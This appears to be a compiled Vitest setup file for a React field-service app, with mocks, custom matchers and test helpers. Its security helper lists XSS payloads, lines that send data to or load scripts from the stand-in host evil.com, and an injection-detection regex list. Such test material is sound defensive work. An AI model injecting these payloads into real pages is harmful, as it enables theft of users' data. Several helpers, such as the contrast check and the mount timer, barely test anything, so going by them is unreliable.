"use strict";
var __assign = (this && this.__assign) || function () {
    __assign = Object.assign || function(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
            s = arguments[i];
            for (var p in s) if (Object.prototype.hasOwnProperty.call(s, p))
                t[p] = s[p];
        }
        return t;
    };
    return __assign.apply(this, arguments);
};
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g = Object.create((typeof Iterator === "function" ? Iterator : Object).prototype);
    return g.next = verb(0), g["throw"] = verb(1), g["return"] = verb(2), typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.SecurityTestUtils = exports.PerformanceTestUtils = exports.AccessibilityTestUtils = exports.TestUtils = void 0;
var jsx_runtime_1 = require("react/jsx-runtime");
/**
 * Enterprise Frontend Testing Setup
 * Comprehensive testing configuration for React components and user interactions
 */
var vitest_1 = require("vitest");
var react_1 = require("@testing-library/react");
var react_query_1 = require("@tanstack/react-query");
var react_router_dom_1 = require("react-router-dom");
var vitest_2 = require("vitest");
var matchers = __importStar(require("@testing-library/jest-dom/matchers"));
// Extend Vitest's expect with jest-dom matchers
vitest_1.expect.extend(matchers);
// Global test configuration
(0, vitest_1.beforeAll)(function () {
    // Mock environment variables
    process.env.VITE_SUPABASE_URL = 'https://test.supabase.co';
    process.env.VITE_SUPABASE_ANON_KEY = 'test-anon-key';
    process.env.VITE_APP_ENV = 'test';
    // Mock console methods to reduce noise in tests
    global.console = __assign(__assign({}, console), { log: vitest_2.vi.fn(), debug: vitest_2.vi.fn(), info: vitest_2.vi.fn(), warn: vitest_2.vi.fn(), error: vitest_2.vi.fn() });
    // Mock window.matchMedia
    Object.defineProperty(window, 'matchMedia', {
        writable: true,
        value: vitest_2.vi.fn().mockImplementation(function (query) { return ({
            matches: false,
            media: query,
            onchange: null,
            addListener: vitest_2.vi.fn(),
            removeListener: vitest_2.vi.fn(),
            addEventListener: vitest_2.vi.fn(),
            removeEventListener: vitest_2.vi.fn(),
            dispatchEvent: vitest_2.vi.fn(),
        }); }),
    });
    // Mock IntersectionObserver
    global.IntersectionObserver = vitest_2.vi.fn().mockImplementation(function () { return ({
        observe: vitest_2.vi.fn(),
        unobserve: vitest_2.vi.fn(),
        disconnect: vitest_2.vi.fn(),
    }); });
    // Mock ResizeObserver
    global.ResizeObserver = vitest_2.vi.fn().mockImplementation(function () { return ({
        observe: vitest_2.vi.fn(),
        unobserve: vitest_2.vi.fn(),
        disconnect: vitest_2.vi.fn(),
    }); });
    // Mock scrollTo
    global.scrollTo = vitest_2.vi.fn();
});
(0, vitest_1.afterEach)(function () {
    (0, react_1.cleanup)();
    vitest_2.vi.clearAllMocks();
});
(0, vitest_1.afterAll)(function () {
    vitest_2.vi.restoreAllMocks();
});
// Custom matchers
vitest_1.expect.extend({
    toBeAccessible: function (received) {
        var hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
        var hasAltText = received.querySelectorAll('img[alt]').length > 0;
        var hasHeadings = received.querySelectorAll('h1, h2, h3, h4, h5, h6').length > 0;
        var hasFocusableElements = received.querySelectorAll('button, input, select, textarea, a[href]').length > 0;
        var isAccessible = hasAriaLabels || hasAltText || hasHeadings || hasFocusableElements;
        return {
            message: function () { return "expected element to be accessible"; },
            pass: isAccessible
        };
    },
    toHaveValidFormValidation: function (received) {
        var hasRequiredFields = received.querySelectorAll('[required]').length > 0;
        var hasValidationMessages = received.querySelectorAll('[aria-invalid]').length > 0;
        var hasFormElements = received.querySelectorAll('form').length > 0;
        var hasValidation = hasRequiredFields || hasValidationMessages || hasFormElements;
        return {
            message: function () { return "expected element to have valid form validation"; },
            pass: hasValidation
        };
    },
    toMeetPerformanceThreshold: function (received, threshold) {
        var meetsThreshold = received <= threshold;
        return {
            message: function () { return "expected ".concat(received, "ms to be <= ").concat(threshold, "ms"); },
            pass: meetsThreshold
        };
    },
    toHaveProperErrorHandling: function (received) {
        var hasErrorMessages = received.querySelectorAll('[role="alert"]').length > 0;
        var hasErrorStates = received.querySelectorAll('[aria-invalid="true"]').length > 0;
        var hasErrorClasses = received.classList.contains('error') || received.classList.contains('invalid');
        var hasErrorHandling = hasErrorMessages || hasErrorStates || hasErrorClasses;
        return {
            message: function () { return "expected element to have proper error handling"; },
            pass: hasErrorHandling
        };
    },
    toBeResponsive: function (received) {
        var hasResponsiveClasses = received.classList.contains('responsive') ||
            received.classList.contains('mobile') ||
            received.classList.contains('tablet') ||
            received.classList.contains('desktop');
        var hasMediaQueries = window.getComputedStyle(received).getPropertyValue('--breakpoint');
        var isResponsive = hasResponsiveClasses || !!hasMediaQueries;
        return {
            message: function () { return "expected element to be responsive"; },
            pass: isResponsive
        };
    },
    toHaveValidAccessibility: function (received) {
        var hasAriaLabels = received.querySelectorAll('[aria-label]').length > 0;
        var hasAriaDescribedBy = received.querySelectorAll('[aria-describedby]').length > 0;
        var hasRole = received.getAttribute('role') !== null;
        var hasTabIndex = received.getAttribute('tabindex') !== null;
        var hasAccessibility = hasAriaLabels || hasAriaDescribedBy || hasRole || hasTabIndex;
        return {
            message: function () { return "expected element to have valid accessibility"; },
            pass: hasAccessibility
        };
    }
});
// Test utilities
var TestUtils = /** @class */ (function () {
    function TestUtils() {
    }
    Object.defineProperty(TestUtils, "createTestQueryClient", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return new react_query_1.QueryClient({
                defaultOptions: {
                    queries: {
                        retry: false,
                        gcTime: 0, // React Query v4+ uses gcTime instead of cacheTime
                    },
                    mutations: {
                        retry: false,
                    },
                },
            });
        }
    });
    Object.defineProperty(TestUtils, "createTestWrapper", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (children) {
            var queryClient = this.createTestQueryClient();
            return ((0, jsx_runtime_1.jsx)(react_query_1.QueryClientProvider, { client: queryClient, children: (0, jsx_runtime_1.jsx)(react_router_dom_1.BrowserRouter, { children: children }) }));
        }
    });
    Object.defineProperty(TestUtils, "mockSupabaseClient", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return {
                auth: {
                    signInWithPassword: vitest_2.vi.fn(),
                    signOut: vitest_2.vi.fn(),
                    getSession: vitest_2.vi.fn(),
                    onAuthStateChange: vitest_2.vi.fn(),
                },
                from: vitest_2.vi.fn(function () { return ({
                    select: vitest_2.vi.fn().mockReturnThis(),
                    insert: vitest_2.vi.fn().mockReturnThis(),
                    update: vitest_2.vi.fn().mockReturnThis(),
                    delete: vitest_2.vi.fn().mockReturnThis(),
                    eq: vitest_2.vi.fn().mockReturnThis(),
                    single: vitest_2.vi.fn(),
                    then: vitest_2.vi.fn(),
                }); }),
            };
        }
    });
    Object.defineProperty(TestUtils, "mockAuthUser", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return {
                id: 'test-user-id',
                email: 'test@example.com',
                user_metadata: {
                    tenant_id: 'test-tenant-id',
                    role: 'dispatcher',
                },
            };
        }
    });
    Object.defineProperty(TestUtils, "mockCustomer", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return {
                id: 'test-customer-id',
                first_name: 'Test',
                last_name: 'Customer',
                email: 'customer@example.com',
                phone: '+1-555-0000',
                address: '123 Test Street',
                city: 'Test City',
                state: 'TC',
                zip_code: '12345',
                tenant_id: 'test-tenant-id',
                created_at: new Date().toISOString(),
                updated_at: new Date().toISOString(),
            };
        }
    });
    Object.defineProperty(TestUtils, "mockWorkOrder", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return {
                id: 'test-work-order-id',
                customer_id: 'test-customer-id',
                technician_id: 'test-technician-id',
                status: 'scheduled',
                priority: 'medium',
                service_type: 'pest_control',
                scheduled_date: new Date().toISOString(),
                description: 'Test work order description',
                tenant_id: 'test-tenant-id',
                created_at: new Date().toISOString(),
                updated_at: new Date().toISOString(),
            };
        }
    });
    Object.defineProperty(TestUtils, "mockTechnician", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return {
                id: 'test-technician-id',
                first_name: 'Test',
                last_name: 'Technician',
                email: 'technician@example.com',
                phone: '+1-555-0000',
                skills: ['pest_control', 'inspection'],
                availability: 'available',
                tenant_id: 'test-tenant-id',
                created_at: new Date().toISOString(),
                updated_at: new Date().toISOString(),
            };
        }
    });
    Object.defineProperty(TestUtils, "measurePerformance", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (fn) {
            return __awaiter(this, void 0, void 0, function () {
                var start, result, duration;
                return __generator(this, function (_a) {
                    switch (_a.label) {
                        case 0:
                            start = performance.now();
                            return [4 /*yield*/, fn()];
                        case 1:
                            result = _a.sent();
                            duration = performance.now() - start;
                            return [2 /*return*/, { result: result, duration: duration }];
                    }
                });
            });
        }
    });
    Object.defineProperty(TestUtils, "generateTestData", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (count, factory) {
            return Array.from({ length: count }, factory);
        }
    });
    Object.defineProperty(TestUtils, "mockLocalStorage", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            var store = {};
            return {
                getItem: vitest_2.vi.fn(function (key) { return store[key] || null; }),
                setItem: vitest_2.vi.fn(function (key, value) {
                    store[key] = value;
                }),
                removeItem: vitest_2.vi.fn(function (key) {
                    delete store[key];
                }),
                clear: vitest_2.vi.fn(function () {
                    Object.keys(store).forEach(function (key) { return delete store[key]; });
                }),
            };
        }
    });
    Object.defineProperty(TestUtils, "mockSessionStorage", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            var store = {};
            return {
                getItem: vitest_2.vi.fn(function (key) { return store[key] || null; }),
                setItem: vitest_2.vi.fn(function (key, value) {
                    store[key] = value;
                }),
                removeItem: vitest_2.vi.fn(function (key) {
                    delete store[key];
                }),
                clear: vitest_2.vi.fn(function () {
                    Object.keys(store).forEach(function (key) { return delete store[key]; });
                }),
            };
        }
    });
    return TestUtils;
}());
exports.TestUtils = TestUtils;
// Accessibility testing utilities
var AccessibilityTestUtils = /** @class */ (function () {
    function AccessibilityTestUtils() {
    }
    Object.defineProperty(AccessibilityTestUtils, "checkAriaLabels", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (element) {
            var inputs = element.querySelectorAll('input, select, textarea');
            var allHaveLabels = true;
            inputs.forEach(function (input) {
                var hasLabel = input.getAttribute('aria-label') ||
                    input.getAttribute('aria-labelledby') ||
                    element.querySelector("label[for=\"".concat(input.id, "\"]"));
                if (!hasLabel) {
                    allHaveLabels = false;
                }
            });
            return allHaveLabels;
        }
    });
    Object.defineProperty(AccessibilityTestUtils, "checkColorContrast", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (element) {
            // Basic color contrast check
            var computedStyle = window.getComputedStyle(element);
            var backgroundColor = computedStyle.backgroundColor;
            var color = computedStyle.color;
            // In a real implementation, you would calculate the contrast ratio
            return backgroundColor !== color;
        }
    });
    Object.defineProperty(AccessibilityTestUtils, "checkKeyboardNavigation", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (element) {
            var focusableElements = element.querySelectorAll('button, input, select, textarea, a[href], [tabindex]:not([tabindex="-1"])');
            return focusableElements.length > 0;
        }
    });
    Object.defineProperty(AccessibilityTestUtils, "checkScreenReaderSupport", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (element) {
            var hasAriaLabels = element.querySelectorAll('[aria-label]').length > 0;
            var hasAriaDescribedBy = element.querySelectorAll('[aria-describedby]').length > 0;
            var hasRole = element.getAttribute('role') !== null;
            return hasAriaLabels || hasAriaDescribedBy || hasRole;
        }
    });
    return AccessibilityTestUtils;
}());
exports.AccessibilityTestUtils = AccessibilityTestUtils;
// Performance testing utilities
var PerformanceTestUtils = /** @class */ (function () {
    function PerformanceTestUtils() {
    }
    Object.defineProperty(PerformanceTestUtils, "measureRenderTime", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (renderFn) {
            return __awaiter(this, void 0, void 0, function () {
                var start, end;
                return __generator(this, function (_a) {
                    start = performance.now();
                    renderFn();
                    end = performance.now();
                    return [2 /*return*/, end - start];
                });
            });
        }
    });
    Object.defineProperty(PerformanceTestUtils, "measureComponentMount", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (_component) {
            return __awaiter(this, void 0, void 0, function () {
                var start, end;
                return __generator(this, function (_a) {
                    start = performance.now();
                    end = performance.now();
                    return [2 /*return*/, end - start];
                });
            });
        }
    });
    Object.defineProperty(PerformanceTestUtils, "checkMemoryUsage", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            if ('memory' in performance) {
                return performance.memory.usedJSHeapSize;
            }
            return 0;
        }
    });
    return PerformanceTestUtils;
}());
exports.PerformanceTestUtils = PerformanceTestUtils;
// Security testing utilities
var SecurityTestUtils = /** @class */ (function () {
    function SecurityTestUtils() {
    }
    Object.defineProperty(SecurityTestUtils, "generateXSSPayloads", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return [
                '<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>'
            ];
        }
    });
    Object.defineProperty(SecurityTestUtils, "generateCSRFPayloads", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function () {
            return [
                '<form action="http://evil.com/steal" method="POST">',
                '<img src="http://evil.com/steal?data=secret">',
                '<iframe src="http://evil.com/steal"></iframe>',
                '<script src="http://evil.com/steal.js"></script>'
            ];
        }
    });
    Object.defineProperty(SecurityTestUtils, "checkInputSanitization", {
        enumerable: false,
        configurable: true,
        writable: true,
        value: function (input) {
            var dangerousPatterns = [
                /<script/i,
                /javascript:/i,
                /on\w+\s*=/i,
                /<iframe/i,
                /<object/i,
                /<embed/i
            ];
            return !dangerousPatterns.some(function (pattern) { return pattern.test(input); });
        }
    });
    return SecurityTestUtils;
}());
exports.SecurityTestUtils = SecurityTestUtils;
